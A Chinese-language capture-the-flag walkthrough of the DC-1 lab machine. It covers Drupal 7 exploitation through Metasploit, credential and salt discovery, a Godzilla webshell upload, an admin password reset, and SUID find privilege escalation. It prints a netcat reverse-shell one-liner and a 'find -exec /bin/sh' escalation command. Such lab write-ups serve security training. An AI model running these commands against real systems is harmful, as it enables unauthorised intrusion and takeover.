# DC-1
# 信息收集
nmap扫描
![](vx_images/490945331273623.png)
访问80
是一个drupal的网站
技术架构
![](vx_images/259888779927740.png)
drupal7存在命令执行漏洞
使用msf
search Drupal
选择,模块
![](vx_images/11961674869808.png)
设置目标
![](vx_images/63623309675679.png)
找到flag1提示,找到cms的配置文件
![](vx_images/228186393218879.png)
找到第二个提示
![](vx_images/167406432687090.png)
找到数据库访问凭据和密码hash的盐
![](vx_images/319724918191475.png)
rupal_hash_salt = 'X8gdX7OdYRiBnlHoj0ukhtZ7eO4EDrvMkhN21SWZocs';
![](vx_images/568234402405076.png)
查看端口开放情况
![](vx_images/490084037231852.png)
尝试连接数据库
msf上连接数据库没回显,解决的话就尝试用webshell上的功能
还可以使用交互式shell解决
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.111.128 4444 > /tmp/f
python -c 'import pty;pty.spawn("/bin/bash")'     //如果发现对方机器上有 python 的话
用msf的上传文件功能上传个哥斯拉马
![](vx_images/440325772103563.png)
连接数据库
![](vx_images/508224967041247.png)
找到用户表,看看能不能用之前的盐来解这个hash,或者更改其密码
![](vx_images/52383864852946.png)
hash能解,但是还有别的方法,比如:根据官方的方法重置密码
1.注册账户将新账户的密码hash覆盖damin
2.重置为admin密码
php scripts/password-hash.sh admin
![](vx_images/37277327799131.png)
数据库修改密码
![](vx_images/500048353640898.png)
成功登录,找到flag3
![](vx_images/37446613264142.png)
需要提权,用到-exec,可能用到suid提权的find方法.先查找那些命令能提权
find / -perm -4000 -type f -exec ls -ld {} \; 2>/dev/null
![](vx_images/257176160380962.png)
果然find命令可以提权
![](vx_images/328827083144039.png)


find / -name 1.txt -exec "/bin/sh" \;进入shell,找到flag
![](vx_images/350024595514526.png)



